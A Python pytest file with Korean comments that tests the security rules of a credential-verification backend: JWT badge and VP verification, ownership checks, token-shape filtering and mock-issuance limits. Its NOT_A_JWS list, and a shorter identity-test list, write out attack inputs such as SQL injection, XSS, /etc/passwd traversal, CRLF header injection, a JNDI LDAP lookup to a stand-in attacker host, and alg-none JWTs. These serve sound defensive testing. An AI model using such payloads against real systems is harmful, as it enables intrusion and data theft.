"""자격증명 신뢰 보안 테스트 (실제 PostgreSQL + 포트를 직접 구현한 가짜 발급·검증기, 가상 데이터).

- 배지 검증(/verify): 검증기가 발급자 서명·신뢰를 확인한 배지만, 로그인 사용자 본인에게 발급된 것만 저장한다.
  확인되지 않은 토큰은 DB를 건드리지 않고 저장하지 않는다 (남의 레코드 덮어쓰기·ID 선점·소유 여부 확인 차단).
  토큰 크기·문자 제한, 형식이 틀린 페이로드는 500이 아닌 검증 실패.
  compact JWS 모양이 아닌 값은 검증기(DXWorks)로 넘기지 않는다 (검증 실패 형식으로 답하고 호출 0번, 감사 로그 한 줄).
  조각 끝에 패딩이 붙은 토큰과 SD-JWT 형식은 받는다.
- 신원 VP: 서버 설정으로 켠 경우에만 받는다(기본 꺼짐, 400). 검증기가 돌려준 홀더 DID가 로그인 사용자 본인 DID여야 한다.
- 모의 발급: 로그인 사용자 토큰으로 본인 DID에만, 허용된 템플릿만, 사용자별 24시간 한도 안에서.
  결과를 모르는 실패(응답 대기 중 시간 초과, jwt 없는 2xx)는 한도에 남기고, 실패까지 세는 시도 한도와 전체 한도를 둔다.
  전체 한도(DB의 전체 발급 수)에 닿으면 사용자 자신의 한도와 다른 문구로 답한다. 협력사 발급이 잇달아 실패하면 태스크
  전체의 실패 차단기가 발급을 멈추고(또 다른 문구 + Retry-After) 분당 하나씩만 보내 보다가, 하나가 성공하면 다시 연다.
"""
import asyncio
import hashlib
import logging
import threading
import time
import uuid
from collections import Counter
from concurrent.futures import ThreadPoolExecutor

import httpx
import psycopg
import pytest

from app.domain.credential import PresentationResult
from app.integrations.ports import ProviderError
from tests.conftest import make_vc_jwt, make_vp_jwt
from tests.test_domain import make_raw_jwt, make_vc_jwt_with

SERVICE = {"X-Service-Key": "test-service-key"}
NOT_SAVED = "Badge verification failed."


def verify(client, user, token: str, headers: dict | None = None):
    return client.post("/api/v1/verify", json={"type": "badge", "token": token},
                       headers=user["headers"] if headers is None else headers)


def credential_count(db, user) -> int:
    return db.execute("SELECT count(*) AS n FROM credentials WHERE user_id = %s", (user["id"],)).fetchone()["n"]


# ── 배지 검증: 정상 흐름은 그대로 ──────────────────────────────────────

def test_confirmed_badges_are_saved_including_revoked_and_expired(client, register, fake_dx, db):
    user = register()
    verified = make_vc_jwt(user["did"])
    res = verify(client, user, verified)
    assert res.status_code == 200
    assert res.json()["success"] is True and res.json()["message"] == "Badge verified and saved."

    # 서명·발급자 신뢰가 확인된 폐기·만료 원본은 상태와 함께 저장한다 (지금과 같음).
    revoked = make_vc_jwt(user["did"])
    fake_dx.set_badge_result(revoked, valid=False, credential_status="REVOKED")
    expired = make_vc_jwt(user["did"], valid_until="2020-01-01T00:00:00Z")
    for token, status in ((revoked, "revoked"), (expired, "expired")):
        body = verify(client, user, token).json()
        assert body["success"] is False and body["data"]["status"] == status
        assert body["message"] == f"Badge verification failed. Saved with status '{status}'."
        row = db.execute("SELECT status, raw_token FROM credentials WHERE record_id = %s",
                         (body["data"]["record_id"],)).fetchone()
        assert row == {"status": status, "raw_token": token}
    assert credential_count(db, user) == 3


def test_same_badge_after_revocation_refreshes_in_place(client, register, fake_dx, db):
    user = register()
    token = make_vc_jwt(user["did"])
    first = verify(client, user, token).json()["data"]
    fake_dx.set_badge_result(token, valid=False, credential_status="REVOKED")
    again = verify(client, user, token).json()["data"]
    assert again["record_id"] == first["record_id"]
    assert db.execute("SELECT status FROM credentials WHERE record_id = %s",
                      (first["record_id"],)).fetchone()["status"] == "revoked"


# ── 배지 검증: 검증기가 확인하지 못한 토큰은 저장하지 않는다 ───────────────

NOT_CONFIRMED = [
    pytest.param({"valid": False}, None, "invalid", id="rejected"),
    pytest.param({"valid": False, "signature_ok": False}, None, "invalid", id="bad-signature"),
    pytest.param({"valid": False, "issuer_trusted": False}, None, "invalid", id="untrusted-issuer"),
    pytest.param({"valid": False, "credential_status": "SUSPENDED"}, None, "invalid", id="suspended"),
    pytest.param({"valid": False, "signature_ok": False, "credential_status": "REVOKED"}, None, "revoked",
                 id="bad-signature-revoked"),
    # 검증기 응답에 서명·신뢰 결과가 없으면 만료일이 지난 위조 토큰은 expired로 판정된다. 그래도 저장하지 않는다.
    pytest.param({"valid": False, "signature_ok": None, "issuer_trusted": None, "credential_status": None},
                 "2020-01-01T00:00:00Z", "expired", id="no-proof-result-expired"),
    # 자기 키로 서명한(신뢰되지 않은 발급자) 만료 토큰
    pytest.param({"valid": False, "issuer_trusted": False}, "2020-01-01T00:00:00Z", "expired",
                 id="self-signed-expired"),
]


@pytest.mark.parametrize("result,valid_until,status", NOT_CONFIRMED)
def test_token_not_confirmed_by_verifier_is_not_saved(client, register, fake_dx, db, result, valid_until, status):
    user = register()
    token = make_vc_jwt(user["did"], valid_until=valid_until)
    fake_dx.set_badge_result(token, **result)
    res = verify(client, user, token)
    assert res.status_code == 200
    body = res.json()
    assert body["success"] is False and body["message"] == NOT_SAVED
    assert body["data"]["status"] == status and body["data"]["record_id"] is None
    assert credential_count(db, user) == 0


def test_unconfirmed_token_never_touches_the_database(client, register, fake_dx, monkeypatch):
    # 확인되지 않은 토큰의 본문(자격증명 ID·수신자)으로는 DB를 조회하지도 않는다 (소유 여부 409·수신자 403 판단 전).
    from app.services.database import db_service

    alice, bob = register(), register()

    def tripwire(*args, **kwargs):
        raise AssertionError("DB must not be used for a token the verifier did not confirm")

    for name in ("find_credential_owner", "save_badge", "get_user_by_did"):
        monkeypatch.setattr(db_service, name, tripwire)
    for user, recipient in ((alice, alice), (bob, alice)):  # 본인 DID, 남의 DID
        token = make_vc_jwt(recipient["did"])
        fake_dx.set_badge_result(token, valid=False, signature_ok=False)
        res = verify(client, user, token)
        assert res.status_code == 200 and res.json()["data"]["record_id"] is None


def test_forged_token_does_not_overwrite_stored_original(client, register, fake_dx, db):
    """회귀: 같은 자격증명 ID로 만든 위조 토큰이 저장된 서명 원본을 덮어쓰지 못한다 (본인 세션·다른 사용자 모두)."""
    victim, mallory = register(), register()
    credential_id = f"urn:uuid:{uuid.uuid4()}"
    genuine = make_vc_jwt(victim["did"], credential_id=credential_id)
    record_id = verify(client, victim, genuine).json()["data"]["record_id"]

    forged = make_vc_jwt(victim["did"], credential_id=credential_id, name="위조 배지", issuer_name="공격자")
    expired_forgery = make_vc_jwt(victim["did"], credential_id=credential_id, name="위조 배지",
                                  valid_until="2020-01-01T00:00:00Z")
    fake_dx.set_badge_result(forged, valid=False, signature_ok=False)
    fake_dx.set_badge_result(expired_forgery, valid=False, signature_ok=None, issuer_trusted=None,
                             credential_status=None)
    for token in (forged, expired_forgery):
        for user in (victim, mallory):  # 훔친 세션의 본인 요청, 다른 사용자의 요청 (예전: 403으로 소유 여부 노출)
            res = verify(client, user, token)
            assert res.status_code == 200 and res.json()["success"] is False
            assert res.json()["data"]["record_id"] is None

    row = db.execute("SELECT status, achievement_name, issuer_name, raw_token FROM credentials WHERE record_id = %s",
                     (record_id,)).fetchone()
    assert row == {"status": "verified", "achievement_name": "테스트 수료 배지", "issuer_name": "예시대학교",
                   "raw_token": genuine}
    assert credential_count(db, mallory) == 0
    reverified = client.post(f"/api/v1/credentials/{record_id}/reverify", headers=victim["headers"])
    assert reverified.status_code == 200 and reverified.json()["success"] is True


def test_forged_token_cannot_claim_or_probe_a_credential_id(client, register, fake_dx, db):
    """회귀: 서명이 거절된 토큰으로 남의 자격증명 ID를 선점(이후 정상 원본이 409)하거나 소유 여부(409)를 알아낼 수 없다."""
    alice, mallory = register(), register()
    future_id, held_id = f"urn:uuid:{uuid.uuid4()}", f"urn:uuid:{uuid.uuid4()}"
    assert verify(client, alice, make_vc_jwt(alice["did"], credential_id=held_id)).json()["success"] is True
    for credential_id in (future_id, held_id):
        squat = make_vc_jwt(mallory["did"], credential_id=credential_id, name="자리 선점")
        fake_dx.set_badge_result(squat, valid=False, signature_ok=False)
        res = verify(client, mallory, squat)
        assert res.status_code == 200 and res.json()["data"]["record_id"] is None
    assert credential_count(db, mallory) == 0

    genuine = make_vc_jwt(alice["did"], credential_id=future_id)
    res = verify(client, alice, genuine)
    assert res.status_code == 200 and res.json()["success"] is True


def test_confirmed_credential_of_another_user_is_409(client, register):
    alice, bob = register(), register()
    credential_id = f"urn:uuid:{uuid.uuid4()}"
    for user, expected in ((alice, 200), (bob, 409)):
        res = verify(client, user, make_vc_jwt(user["did"], credential_id=credential_id))
        assert res.status_code == expected
    assert res.json() == {"detail": "Credential already registered to another user"}


# ── 배지 검증: 수신자는 로그인 사용자 본인 ───────────────────────────────

def test_confirmed_badge_for_another_or_unregistered_did_is_403(client, register, db):
    alice, bob = register(), register()
    ghost = f"did:key:z6MkUnregistered{uuid.uuid4().hex[:6]}"
    for did in (alice["did"], ghost):
        res = verify(client, bob, make_vc_jwt(did))
        assert res.status_code == 403
        assert res.json() == {"detail": "Forbidden: credential was issued to a different DID"}
    # 예전 익명 경로처럼 수신자 DID로 사용자를 찾거나(404) 만들지 않는다.
    assert db.execute("SELECT 1 FROM users WHERE subject_did = %s", (ghost,)).fetchone() is None
    assert credential_count(db, alice) == 0 and credential_count(db, bob) == 0


def test_verify_without_user_token_never_reaches_verifier(client, register, fake_dx, db):
    # 예전 전환 기간에는 토큰 없이도 수신자 DID의 지갑에 저장됐다 (남의 지갑에 배지를 넣을 수 있었음).
    user = register()
    fake_dx.error = AssertionError("verifier must not be called")
    anonymous = verify(client, user, make_vc_jwt(user["did"]), headers={})
    assert anonymous.status_code == 401 and anonymous.headers["www-authenticate"] == "Bearer"
    assert verify(client, user, make_vc_jwt(user["did"]), headers=SERVICE).status_code == 403  # 서비스 키는 읽기 전용
    assert credential_count(db, user) == 0


# ── 배지 검증: 토큰 크기·문자 ────────────────────────────────────────

def test_verify_token_length_is_capped_before_the_verifier(client, register, fake_dx):
    from app.api.verify import MAX_TOKEN_CHARS

    user = register()
    token = make_vc_jwt(user["did"])
    longest = token + "A" * (MAX_TOKEN_CHARS - len(token))  # 서명 부분만 늘린, 상한 길이의 토큰
    res = verify(client, user, longest)
    assert res.status_code == 200 and res.json()["success"] is True

    fake_dx.error = RuntimeError("must not reach the verifier")  # 검증기에 닿으면 500
    res = verify(client, user, longest + "A")
    assert res.status_code == 422 and res.json()["detail"][0]["loc"] == ["body", "token"]


@pytest.mark.parametrize("make_token", [
    lambda did: make_vc_jwt(did) + "\x00",
    lambda did: "\x00" + make_vc_jwt(did),
], ids=["nul-at-end", "nul-at-start"])
def test_verify_token_with_nul_is_422_before_the_verifier(client, register, fake_dx, db, make_token):
    user = register()
    fake_dx.error = RuntimeError("must not reach the verifier")
    res = verify(client, user, make_token(user["did"]))
    assert res.status_code == 422 and res.json()["detail"][0]["loc"] == ["body", "token"]
    assert credential_count(db, user) == 0


# ── 배지 검증: compact JWS 모양이 아닌 값은 검증기로 넘기지 않는다 ─────────

NOT_A_JWS = {
    "one-char": "x",
    "plain-text": "not-a-jwt",
    "sql": "' OR 1=1; DROP TABLE credentials;--",
    "xss": "<script>alert(1)</script>",
    "path-traversal": "../../../../etc/passwd",
    "crlf-header-injection": "a.b.c\r\nX-Injected: 1\r\nAuthorization: Bearer stolen",
    "jndi-template": "${jndi:ldap://attacker.invalid/a}{{7*7}}",
    "json-smuggling": 'x","templateId":"other","holderDid":"did:x',
    "control-chars": "a\x01\x02\x1b[2K\x7f.b.c",
    "rtl-zero-width": "a\u202e\u200b.b.c",
    "two-segments": "eyJhbGciOiJFZERTQSJ9.e30",
    "four-segments": "eyJhbGciOiJFZERTQSJ9.e30.c2ln.c2ln",
    "empty-signature": "eyJhbGciOiJFZERTQSJ9.e30.",
    "three-padding-chars": "eyJhbGciOiJFZERTQSJ9.e30===.c2ln",
    "padding-inside-a-segment": "eyJhbGciOiJFZERTQSJ9.e3=0.c2ln",
    "header-not-base64-json": "a.b.c",
    "header-json-list": "WyJFZERTQSJd.e30.c2ln",
    "header-without-alg": "eyJ0eXAiOiJKV1QifQ.e30.c2ln",
    "alg-none": "eyJhbGciOiJub25lIn0.e30.c2ln",
    "alg-None-mixed-case": "eyJhbGciOiJOb05lIn0.e30.c2ln",
    "alg-not-a-string": "eyJhbGciOjF9.e30.c2ln",
    "alg-none-with-space": "eyJhbGciOiAiIG5vbmUifQ.e30.c2ln",  # {"alg": " none"}
    "alg-duplicate-key": "eyJhbGciOiJub25lIiwiYWxnIjoiUlMyNTYifQ.e30.c2ln",  # {"alg":"none","alg":"RS256"}
    "header-utf-16": "__57ACIAYQBsAGcAIgA6ACIARQBkAEQAUwBBACIAfQA.e30.c2ln",  # UTF-16 {"alg":"EdDSA"}
    "non-ascii-emoji": "\U0001F600" * 64,
    "non-ascii-in-signature": "eyJhbGciOiJFZERTQSJ9.e30.서명",
    "sd-jwt-without-final-tilde": "eyJhbGciOiJFZERTQSJ9.e30.c2ln~WyJzYWx0Il0",
    "sd-jwt-empty-disclosure": "eyJhbGciOiJFZERTQSJ9.e30.c2ln~~",
    "sd-jwt-disclosure-not-base64url": "eyJhbGciOiJFZERTQSJ9.e30.c2ln~<script>~",
}


@pytest.mark.parametrize("token", list(NOT_A_JWS.values()), ids=list(NOT_A_JWS))
def test_verify_non_jws_token_is_answered_without_calling_the_verifier(client, register, fake_dx, db, token, caplog):
    # 예전에는 길이·NUL만 확인하고 어떤 문자열이든 그대로 검증기(DXWorks)로 보냈다. 이제 compact JWS 모양이 아니면
    # 검증기를 부르지 않고(닿으면 500) 지금의 '저장하지 않음' 응답으로 답한다.
    user = register()
    fake_dx.error = RuntimeError("must not reach the verifier")
    with caplog.at_level(logging.INFO, logger="vc-be.audit"):
        res = verify(client, user, token)
    assert res.status_code == 200
    body = res.json()
    assert body["success"] is False and body["message"] == NOT_SAVED
    assert body["data"]["record_id"] is None and body["data"]["status"] == "invalid" and body["data"]["valid"] is False
    assert {c["name"]: c["result"] for c in body["data"]["checks"]}["signature"] == "fail"
    assert credential_count(db, user) == 0
    # 검증기를 부르지 않아 event=verifier_calls 줄이 없다: 모양 때문에 거절했다는 흔적을 한 줄 남긴다 (토큰·길이 없음).
    assert [r.getMessage() for r in caplog.records if r.name == "vc-be.audit"] == [
        f"event=verify_shape_refused user={user['id']}"]


def padded(token: str) -> str:
    """조각마다 base64 패딩 '='를 붙인 같은 토큰."""
    return ".".join(part + "=" * (-len(part) % 4) for part in token.split("."))


SIGNED_FORMS = {
    "padded-segments": padded,
    "sd-jwt-no-disclosure": lambda token: token + "~",
    "sd-jwt-with-disclosures": lambda token: token + "~WyJzYWx0IiwgIm5hbWUiLCAieCJd~WyJzYWx0MiIsICJhIiwgMV0~",
    "sd-jwt-with-key-binding": lambda token: (
        token + "~WyJzYWx0IiwgIm5hbWUiLCAieCJd~eyJhbGciOiJFZERTQSIsInR5cCI6ImtiK2p3dCJ9.eyJub25jZSI6Im4ifQ.a2Jfc2ln"),
    "sd-jwt-padded-segments": lambda token: padded(token) + "~",
}


@pytest.mark.parametrize("form", list(SIGNED_FORMS.values()), ids=list(SIGNED_FORMS))
def test_verify_accepts_padded_segments_and_sd_jwt_forms(client, register, fake_dx, db, form, caplog):
    # 회귀: 모양 필터가 패딩 없는 조각 셋만 받아, 조각 끝에 '='를 붙여 내는 발급기의 토큰과 SD-JWT 형식은 검증기를 부르지도
    # 않고 '검증 실패'로 답했다 (기존 해석기는 둘 다 읽는다). 이제 검증기로 보내고 지금처럼 판정·저장한다.
    user = register()
    token = form(make_vc_jwt(user["did"]))
    assert "=" in token or "~" in token
    with caplog.at_level(logging.INFO, logger="vc-be.audit"):
        res = verify(client, user, token)
    assert res.status_code == 200 and res.json()["success"] is True, res.text
    record_id = res.json()["data"]["record_id"]
    row = db.execute("SELECT status, raw_token FROM credentials WHERE record_id = %s", (record_id,)).fetchone()
    assert row == {"status": "verified", "raw_token": token}  # 받은 그대로 저장하고 재검증에도 그대로 쓴다
    assert [r.getMessage() for r in caplog.records if r.name == "vc-be.audit"] == [
        f"event=verifier_calls user={user['id']} route=verify_badge calls=1 failed=0"]
    reverified = client.post(f"/api/v1/credentials/{record_id}/reverify", headers=user["headers"])
    assert reverified.status_code == 200 and reverified.json()["success"] is True


def test_verify_largest_non_ascii_token_is_not_relayed(client, register, fake_dx):
    # ASCII가 아닌 토큰은 검증기로 가지 않는다. POST /verify의 본문 상한(320 KiB) 안에 들어가는 가장 긴 4바이트 문자열로 본다.
    from app.api.verify import MAX_TOKEN_CHARS
    from main import MAX_VERIFY_BODY_BYTES

    user = register()
    fake_dx.error = RuntimeError("must not reach the verifier")
    res = verify(client, user, "\U0001F600" * ((MAX_VERIFY_BODY_BYTES - 100) // 4))
    assert MAX_VERIFY_BODY_BYTES - 100 < len(res.request.content) <= MAX_VERIFY_BODY_BYTES
    assert res.status_code == 200 and res.json()["message"] == NOT_SAVED
    # 글자 수 상한(256K자)을 채운 4바이트 문자열은 본문이 1 MiB가 넘는다: 이제 본문 상한에 걸려 읽기 전에 413이다
    # (서명 원본은 ASCII라 정상 요청의 본문은 256 KiB 남짓이다. 예전에는 2 MiB 상한 안이라 위와 같은 답이었다).
    res = verify(client, user, "\U0001F600" * MAX_TOKEN_CHARS)
    assert res.status_code == 413 and res.text == "Content Too Large"


# ── 배지 검증: 형식이 틀린 페이로드는 500이 아니라 검증 실패 ───────────────

@pytest.mark.parametrize("make_token", [
    lambda did: make_vc_jwt_with(did, vc={"validUntil": "RAW"}, raw="Infinity"),
    lambda did: make_vc_jwt_with(did, vc={"score": "RAW"}, raw="1e400"),
    lambda did: make_raw_jwt('{"vc": ' + "[" * 5000 + "]" * 5000 + "}"),  # json.loads RecursionError
    lambda did: make_vc_jwt_with(did, vc={"note": "x\x00"}),
    lambda did: make_vc_jwt_with(did, vc={"credentialSubject": {"id": did, "achievement": {"name": "\ud800"}}}),
    lambda did: make_vc_jwt_with(did, vc={"credentialSubject": {"achievement": {"name": "\ud800"}}}),
], ids=["infinity", "1e400", "deep-nesting", "nul", "lone-surrogate", "lone-surrogate-without-recipient"])
def test_verify_unstorable_payload_is_a_normal_failure_not_500(client, register, db, make_token):
    user = register()
    res = verify(client, user, make_token(user["did"]))
    assert res.status_code == 200
    assert res.json()["success"] is False and res.json()["data"]["record_id"] is None
    assert res.json()["data"]["status"] == "invalid"
    assert credential_count(db, user) == 0


def test_verify_too_deep_payload_is_not_saved_and_wallet_stays_readable(client, register, fake_dx, db):
    # 회귀: json.loads가 받아들이는 한계(약 950단계) 바로 아래 깊이는 검증기가 확인하면 저장된 뒤, GET /careers 응답 JSON을
    # 만들 때 재귀 한도에 걸려 그 사용자의 지갑 조회가 계속 500이었다. 이제 64단계(MAX_JSON_DEPTH)를 넘는 페이로드는
    # 해석하지 않으므로 검증기가 확인해도 저장하지 않는다 (지금의 'invalid' 미저장 응답). 40단계는 지금처럼 저장한다.
    user = register()

    def nested_token(depth: int) -> str:
        # 페이로드(1단계) → vc(2단계) → extra 목록 depth-2겹 = 전체 depth단계
        credential_id = f"urn:uuid:{uuid.uuid4()}"
        token = make_vc_jwt_with(user["did"], vc={"id": credential_id, "extra": "RAW"},
                                 raw="[" * (depth - 2) + "]" * (depth - 2))
        # 검증기는 서명·신뢰를 확인하고 이 사용자에게 발급된 것으로 답한다 (깊이와 관계없이).
        fake_dx.set_badge_result(token, recipient_did=user["did"], credential_id=credential_id)
        return token

    shallow = verify(client, user, nested_token(40))
    assert shallow.status_code == 200 and shallow.json()["success"] is True
    for depth in (65, 100, 500, 950):
        res = verify(client, user, nested_token(depth))
        assert res.status_code == 200
        assert res.json()["success"] is False and res.json()["message"] == NOT_SAVED
        assert res.json()["data"]["status"] == "invalid" and res.json()["data"]["record_id"] is None
    assert credential_count(db, user) == 1
    careers = client.get(f"/api/v1/subjects/{user['did']}/careers", headers=user["headers"])
    assert careers.status_code == 200 and len(careers.json()["verified_credentials"]) == 1


def test_verify_unusable_recipient_from_verifier_is_a_normal_failure(client, register, fake_dx):
    user = register()
    # 검증기가 토큰 속 값을 그대로 돌려준 경우: 짝 없는 서로게이트는 UTF-8 응답으로 만들 수 없어 예전에는 500이었다.
    # (compact JWS 모양이어야 검증기까지 간다. 페이로드는 해석할 수 없는 값이다.)
    token = make_raw_jwt("garbage")
    fake_dx.set_badge_result(token, valid=False, recipient_did="\ud800")
    res = verify(client, user, token)
    assert res.status_code == 200
    assert res.json()["success"] is False and res.json()["data"]["recipient_did"] is None


def test_verify_extreme_dates_keep_wallet_and_reverification_readable(client, register):
    user = register()
    far = make_vc_jwt_with(user["did"], vc={"validUntil": "9999-12-31T23:59:59-14:00",
                                            "validFrom": "0001-01-01T00:00:00+14:00"})
    res = verify(client, user, far)
    assert res.status_code == 200 and res.json()["success"] is True
    assert res.json()["data"]["expires_at"] == "9999-12-30T00:00:00+00:00"
    past = make_vc_jwt_with(user["did"], top={"exp": -10**18})
    res_past = verify(client, user, past)
    assert res_past.status_code == 200 and res_past.json()["data"]["status"] == "expired"
    # 예전에는 저장은 됐지만 psycopg가 연도 1~9999 밖의 timestamptz를 읽지 못해 이 사용자의 조회가 모두 500이었다.
    assert client.get(f"/api/v1/subjects/{user['did']}/careers", headers=user["headers"]).status_code == 200
    assert client.get(f"/api/v1/subjects/{user['did']}/evidence", headers=user["headers"]).status_code == 200
    record_id = res.json()["data"]["record_id"]
    assert client.post(f"/api/v1/credentials/{record_id}/reverify", headers=user["headers"]).status_code == 200


def test_verify_long_names_and_ids_are_saved_not_500(client, register, db):
    user = register()
    token = make_vc_jwt_with(user["did"], vc={"id": "https://issuer.example.org/badges/" + "a" * 300,
                                              "issuer": {"id": "https://issuer.example.org/demo", "name": "기" * 300},
                                              "credentialSubject": {"id": user["did"],
                                                                    "achievement": {"name": "배" * 300}}})
    res = verify(client, user, token)
    assert res.status_code == 200 and res.json()["success"] is True
    data = res.json()["data"]
    assert data["achievement_name"] == "배" * 255  # VARCHAR(255)
    row = db.execute("SELECT source_external_id, issuer_name FROM credentials WHERE record_id = %s",
                     (data["record_id"],)).fetchone()
    assert row["source_external_id"].startswith("sha256:") and row["issuer_name"] == "기" * 255
    assert client.get(f"/api/v1/subjects/{user['did']}/careers", headers=user["headers"]).status_code == 200
    # 같은 원본을 다시 검증하면 같은 레코드를 갱신한다.
    assert verify(client, user, token).json()["data"]["record_id"] == data["record_id"]


# ── 신원 VP: 홀더 DID는 로그인 사용자 본인 ─────────────────────────────

@pytest.mark.parametrize("holder_did", [None, "", "   ", 0, False, ["did:key:x"], "did:key:z6MkSomeoneElse"],
                         ids=["none", "empty", "blank", "zero", "false", "list", "other-did"])
def test_identity_vp_holder_must_be_the_caller(client, register, fake_dx, monkeypatch, identity_enabled, holder_did):
    user = register()

    async def presentation(vp_token):
        return PresentationResult(verified=True, holder_did=holder_did, claims={"name": "다른학생"})

    monkeypatch.setattr(fake_dx, "verify_presentation", presentation)
    res = client.post("/api/v1/verify", json={"type": "identity", "token": make_vp_jwt(user["did"])},
                      headers=user["headers"])
    assert res.status_code == 403 and res.json() == {"detail": "Forbidden: presentation holder is not you"}
    assert "다른학생" not in res.text  # 다른 사람(또는 누구인지 모르는) VP의 클레임을 돌려주지 않는다


def test_identity_vp_of_the_caller_is_unchanged(client, register, fake_dx, monkeypatch, identity_enabled):
    user = register()
    # FakeProvider는 VP 토큰(make_vp_jwt)의 iss를 홀더 DID로 돌려준다.
    vp = make_vp_jwt(user["did"])
    res = client.post("/api/v1/verify", json={"type": "identity", "token": vp}, headers=user["headers"])
    assert res.status_code == 200
    assert res.json() == {"success": True, "message": "Identity verified.",
                          "data": {"verified": True, "holder_did": user["did"], "claims": {"name": "가상학생"}}}

    async def rejected(vp_token):
        return PresentationResult(verified=False, holder_did=user["did"], claims={})

    monkeypatch.setattr(fake_dx, "verify_presentation", rejected)
    res = client.post("/api/v1/verify", json={"type": "identity", "token": vp}, headers=user["headers"])
    assert res.status_code == 200 and res.json()["success"] is False


def test_identity_verification_is_off_by_default_and_never_reaches_the_verifier(client, register, fake_dx):
    # 신원 VP 검증은 이 제품의 화면이 쓰지 않는다. 사용자 입력에 회사 API 키를 붙여 협력사로 보내는 경로라서 기본은 꺼 둔다.
    from app.core.config import get_settings

    assert get_settings().identity_verification_enabled is False
    user = register()
    fake_dx.error = AssertionError("verifier must not be called")
    for token in (make_vp_jwt(user["did"]), "not-a-vp"):
        res = client.post("/api/v1/verify", json={"type": "identity", "token": token}, headers=user["headers"])
        assert res.status_code == 400 and res.json() == {"detail": "Identity verification is disabled"}
    # 서비스 키는 지금처럼 쓰기 API를 부를 수 없고(403), 지원하지 않는 type은 400이다.
    assert client.post("/api/v1/verify", json={"type": "identity", "token": "x"}, headers=SERVICE).status_code == 403


@pytest.mark.parametrize("token", ["vp", "did:key:z6MkSomeone", "a.b.c.d", "eyJhbGciOiJub25lIn0.e30.c2ln",
                                   "' OR 1=1;--", "a.b.c\r\nX-Injected: 1"])
def test_identity_token_must_look_like_a_compact_jws(client, register, fake_dx, identity_enabled, token):
    # 켜져 있어도 compact JWS 모양이 아닌 값은 회사 API 키와 함께 협력사로 보내지 않는다 (422, 검증기 호출 0번).
    user = register()
    fake_dx.error = AssertionError("verifier must not be called")
    res = client.post("/api/v1/verify", json={"type": "identity", "token": token}, headers=user["headers"])
    assert res.status_code == 422 and res.json() == {"detail": "Invalid token format"}


# ── 모의 발급 ────────────────────────────────────────────────────────

def issue(client, user, headers: dict | None = None, **body):
    return client.post("/api/mock-issuer/issue", json={"holderDid": user["did"], **body},
                       headers=user["headers"] if headers is None else headers)


def issuance_rows(db, user) -> list[dict]:
    return db.execute("SELECT template_id, token_sha256 FROM mock_issuances WHERE user_id = %s ORDER BY created_at",
                      (user["id"],)).fetchall()


def use_settings(monkeypatch, **env):
    from app.core.config import get_settings

    for name, value in env.items():
        monkeypatch.setenv(name, value)
    get_settings.cache_clear()


def test_mock_issue_default_template_then_verify_end_to_end(client, register, fake_dx, db):
    """FE 발급 화면 흐름: 템플릿 ID 없이 발급 → 받은 vcJwt로 검증·저장 → 지갑에 verified로 보인다."""
    user = register()
    res = issue(client, user)
    assert res.status_code == 200
    body = res.json()
    assert body["success"] is True and body["message"] == "Successfully issued a mock badge"
    assert fake_dx.issued == [("tpl-default", user["did"])]
    # 발급 기록에는 원문 대신 해시만 남긴다.
    assert issuance_rows(db, user) == [{"template_id": "tpl-default",
                                        "token_sha256": hashlib.sha256(body["vcJwt"].encode()).hexdigest()}]

    assert verify(client, user, body["vcJwt"]).json()["success"] is True
    careers = client.get(f"/api/v1/subjects/{user['did']}/careers", headers=user["headers"]).json()
    assert [c["status"] for c in careers["verified_credentials"]] == ["verified"]


def test_mock_issue_requires_a_user_token(client, register, fake_dx, db):
    # 회사 API 키로 발급하므로 토큰 없는 요청과 서비스 키는 401이다.
    victim = register()
    for headers in ({}, SERVICE):
        for body in ({}, {"templateId": "tpl-ANY-partner-template"}):
            res = issue(client, victim, headers=headers, **body)
            assert res.status_code == 401 and res.json() == {"detail": "Authentication required"}
            assert res.headers["www-authenticate"] == "Bearer"
    assert fake_dx.issued == [] and issuance_rows(db, victim) == []


def test_mock_issue_rejects_template_outside_allowlist(client, register, fake_dx, db):
    user = register()
    for template in ("another-program-template-id", "tpl-default-but-longer", "TPL-DEFAULT"):
        res = issue(client, user, templateId=template)
        assert res.status_code == 403 and res.json() == {"detail": "Template not allowed"}
    assert issue(client, user, templateId="t" * 256).status_code == 422
    assert fake_dx.issued == [] and issuance_rows(db, user) == []  # 협력사 API를 부르지 않고 한도도 쓰지 않는다

    # 앞뒤 공백은 지우고, 비었으면 기본 템플릿을 쓴다 (지금과 같음).
    for template in (" tpl-default ", "   "):
        assert issue(client, user, templateId=template).status_code == 200
    assert fake_dx.issued == [("tpl-default", user["did"])] * 2


def test_mock_issue_extra_templates_come_from_settings(client, register, fake_dx, monkeypatch):
    use_settings(monkeypatch, MOCK_ISSUER_TEMPLATE_IDS="tpl-demo-a, tpl-demo-b")
    user = register()
    assert issue(client, user, templateId="tpl-demo-b").status_code == 200
    assert issue(client, user).status_code == 200  # 기본 템플릿은 항상 허용
    assert issue(client, user, templateId="tpl-demo-c").status_code == 403
    assert fake_dx.issued == [("tpl-demo-b", user["did"]), ("tpl-default", user["did"])]


def test_mock_issue_to_other_did_is_403(client, register, fake_dx, db):
    alice, bob = register(), register()
    res = client.post("/api/mock-issuer/issue", json={"holderDid": alice["did"]}, headers=bob["headers"])
    assert res.status_code == 403 and res.json() == {"detail": "Forbidden: can only issue to your own DID"}
    assert fake_dx.issued == [] and issuance_rows(db, bob) == []


def test_mock_issue_daily_limit_is_per_user(client, register, fake_dx, monkeypatch, db):
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="2")
    alice, bob = register(), register()
    tokens = []
    for _ in range(2):
        res = issue(client, alice)
        assert res.status_code == 200
        tokens.append(res.json()["vcJwt"])
    limited = issue(client, alice)
    assert limited.status_code == 429
    assert limited.json() == {"detail": "Mock issuance limit reached; try again later"}
    assert issue(client, bob).status_code == 200  # 다른 사용자는 따로 센다
    assert len(fake_dx.issued) == 3  # 한도에 걸린 요청은 협력사로 가지 않는다
    rows = issuance_rows(db, alice)
    assert sorted(r["token_sha256"] for r in rows) == sorted(hashlib.sha256(t.encode()).hexdigest() for t in tokens)


# DB·역할·RDS 파라미터 그룹의 default_transaction_isolation을 libpq PGOPTIONS로 흉내 낸다 (앱의 새 DB 연결마다 적용).
DEFAULT_ISOLATION = {"repeatable read": r"repeatable\ read", "serializable": "serializable"}


def use_default_isolation(monkeypatch, level: str) -> None:
    from app.services.database import get_db_connection

    monkeypatch.setenv("PGOPTIONS", f"-c default_transaction_isolation={DEFAULT_ISOLATION[level]}")
    with get_db_connection() as conn:
        assert conn.execute("SHOW default_transaction_isolation").fetchone()["default_transaction_isolation"] == level


